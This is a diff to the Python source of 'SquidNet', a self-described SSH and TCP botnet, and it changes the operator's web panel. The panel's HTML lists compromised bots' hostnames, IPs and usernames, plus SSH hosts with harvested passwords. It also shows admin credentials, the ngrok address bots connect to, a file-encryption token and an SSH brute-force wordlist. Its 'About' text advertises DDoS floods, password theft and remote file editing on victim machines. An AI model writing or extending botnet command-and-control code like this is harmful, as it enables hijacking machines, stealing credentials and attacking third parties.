@@ -4782,8 +4782,8 @@ class Web_Interface:
         self.packet = ""
         self.listener = threading.Thread(target=self.listen)
         self.listener.start()
-        self.packetmaker = threading.Thread(target=self.packetmaker)
-        self.packetmaker.start()
+        self.packets = threading.Thread(target=self.packetmaker)
+        self.packets.start()
     def packetmaker(self):
         """This function generates the packet to send
         to the client and also for updating the Web-Interface."""
@@ -4792,102 +4792,102 @@ class Web_Interface:
                 conn_bots = ""
                 for x in botnet.botnet.info:
                     conn_bots += '<tr>\n<td>' + x.split()[0] + '</td>\n<td>' + x.split()[1] + "</td>\n<td>" + x.split()[
-                        2] + "</td>\n<td>" + x.split()[3] + "</td>\n<td>"+x.split()[4]+"</td>\n</tr>\n"
+                        2] + "</td>\n<td>" + x.split()[3] + "</td>\n<td>" + x.split()[4] + "</td>\n</tr>\n"
                 conn_admin = ""
                 for x in botnet.botnet.admininfo:
                     conn_admin += '<tr>\n<td>' + x.split()[0] + '</td>\n<td>' + x.split()[1] + "</td>\n<td>" + x.split()[
-                        2] + "</td>\n<td>" + x.split()[3] + "</td>\n<td>"+x.split()[4]+"</td>\n</tr>\n"
+                        2] + "</td>\n<td>" + x.split()[3] + "</td>\n<td>" + x.split()[4] + "</td>\n</tr>\n"
                 conn_ssh = ""
                 for x in botnet.botnet.ssh_info:
                     conn_ssh += '<tr>\n<td>' + x.split()[0] + '</td>\n<td>' + x.split()[1] + "</td>\n<td>" + x.split()[
                         2] + "</td>\n</tr>\n"
                 self.packet = """
-<!DOCTYPE html>
-<html lang="en">
-<meta charset="UTF-8">
-<title>SquidNet Web-Interface</title>
-<head>
-<style>
-        table {
-            border: 3px solid black;
-            font-size: 50px
-            border-collapse: collapse;
-            font: arial;
-
-        }
-
-        td, th {
-            border: 1px solid black;
-            padding: 5px;
-
-        }
-
-    </style>
-</head>
-<body>
-<h1>SquidNet Web Interface<h1>
-<h3>(Clearly HTML is not my base language so it doesn't look too good)<h3>
-<h1>Connections To the Botnet<h1>
-<table>
-<thead>
-<tr>
-<th>Hostname</th>
-<th>IP Address</th>
-<th>UserName</th>
-<th>Connection</th>
-<th>OS</th>
-</tr>
-</thead>
-<tbody>
-""" + str(conn_bots) + """
-</tbody>
-</table>
-<h1>Admin Connections To the Botnet<h1>
-<table>
-<thead>
-<tr>
-<th>Hostname</th>
-<th>IP Address</th>
-<th>UserName</th>
-<th>Connection</th>
-<th>OS</th>
-</tr>
-</thead>
-<tbody>
-"""+str(conn_admin)+"""
-</tbody>
-</table>
-<h1>SSH Connections to the Botnet</h1>
-<table>
-<thead>
-<tr>
-<th>Hostname</th>
-<th>IP Address</th>
-<th>Password</th>
-</tr>
-</thead>
-<tbody>
-"""+str(conn_ssh)+"""
-</tbody>
-</table>
-<h2>About:</h2>
-</h4>Squidnet is an SSH and TCP Botnet Hybrid. The Botnet has the ability to take control of computers compromised by the
-bot script, as well as gaining access to ssh servers. It also has a form of security in which admins need to provide a username and
-a password in order to gain access. They will be kicked if they do not enter the correct credentials. The Bots can do many
-things including DDoS Attacks(HTTP, TCP and UDP Floods), sending their passwords to the Botnet, editing files remotely,
-and many more.</h4>
-<h2>Important Info</h2>
-<h4>Server Log file: """+os.getcwd()+"""\\servlog.txt - Good for checking for errors and server output.</h4>
-<h4>Server IP: """+str(botnet.botnet.ngroklink)+""":"""+str(botnet.botnet.ngrokport)+""" - How Bots will connect to the Botnet.</h4>
-<h4>Admin Username: """+str(botnet.botnet.admin_name)+""" - Username Used by Admins to obtain access to the Botnet</h4>
-<h4>Admin Password: """+str(botnet.botnet.passw)+""" - Password Used by Admins to obtain access to the Botnet.</h4>
-<h4>Encryption Token: """+str(botnet.botnet.key)+""" - Used for encrypting files on the bots.</h4>
-<h4>Brute-Forcing-File: """+str(botnet.botnet.passfilename)+""" - Used for SSH-Brute-Forcing.</h4>
-</body>
-</html>
+                <!DOCTYPE html>
+                <html lang="en">
+                <meta charset="UTF-8">
+                <title>SquidNet Web-Interface</title>
+                <head>
+                <style>
+                        table {
+                            border: 3px solid black;
+                            font-size: 50px
+                            border-collapse: collapse;
+                            font: arial;
+    
+                        }
+    
+                        td, th {
+                            border: 1px solid black;
+                            padding: 5px;
+    
+                        }
+    
+                    </style>
+                </head>
+                <body>
+                <h1>SquidNet Web Interface<h1>
+                <h3>(Clearly HTML is not my base language so it doesn't look too good)<h3>
+                <h1>Connections To the Botnet<h1>
+                <table>
+                <thead>
+                <tr>
+                <th>Hostname</th>
+                <th>IP Address</th>
+                <th>UserName</th>
+                <th>Connection</th>
+                <th>OS</th>
+                </tr>
+                </thead>
+                <tbody>
+                """ + str(conn_bots) + """
+                </tbody>
+                </table>
+                <h1>Admin Connections To the Botnet<h1>
+                <table>
+                <thead>
+                <tr>
+                <th>Hostname</th>
+                <th>IP Address</th>
+                <th>UserName</th>
+                <th>Connection</th>
+                <th>OS</th>
+                </tr>
+                </thead>
+                <tbody>
+                """ + str(conn_admin) + """
+                </tbody>
+                </table>
+                <h1>SSH Connections to the Botnet</h1>
+                <table>
+                <thead>
+                <tr>
+                <th>Hostname</th>
+                <th>IP Address</th>
+                <th>Password</th>
+                </tr>
+                </thead>
+                <tbody>
+                """ + str(conn_ssh) + """
+                </tbody>
+                </table>
+                <h2>About:</h2>
+                </h4>Squidnet is an SSH and TCP Botnet Hybrid. The Botnet has the ability to take control of computers compromised by the
+                bot script, as well as gaining access to ssh servers. It also has a form of security in which admins need to provide a username and
+                a password in order to gain access. They will be kicked if they do not enter the correct credentials. The Bots can do many
+                things including DDoS Attacks(HTTP, TCP and UDP Floods), sending their passwords to the Botnet, editing files remotely,
+                and many more.</h4>
+                <h2>Important Info</h2>
+                <h4>Server Log file: """ + os.getcwd() + """\\servlog.txt - Good for checking for errors and server output.</h4>
+                <h4>Server IP: """ + str(botnet.botnet.ngroklink) + """:""" + str(botnet.botnet.ngrokport) + """ - How Bots will connect to the Botnet.</h4>
+                <h4>Admin Username: """ + str(botnet.botnet.admin_name) + """ - Username Used by Admins to obtain access to the Botnet</h4>
+                <h4>Admin Password: """ + str(botnet.botnet.passw) + """ - Password Used by Admins to obtain access to the Botnet.</h4>
+                <h4>Encryption Token: """ + str(botnet.botnet.key) + """ - Used for encrypting files on the bots.</h4>
+                <h4>Brute-Forcing-File: """ + str(botnet.botnet.passfilename) + """ - Used for SSH-Brute-Forcing.</h4>
+                </body>
+                </html>
                             """
                 time.sleep(1)
-            except Exception as e:
+            except:
                 pass
     def listen(self):
         """Listens for and accepts connections."""
@@ -4903,8 +4903,6 @@ and many more.</h4>
         conn.send('Content-Type: text/html\n'.encode())
         conn.send('\n'.encode())
         conn.send(self.packet.encode())
-        conn.close()
-
 """Clears CMD Output."""
 if sys.platform == "win32":
     os.system("cls")
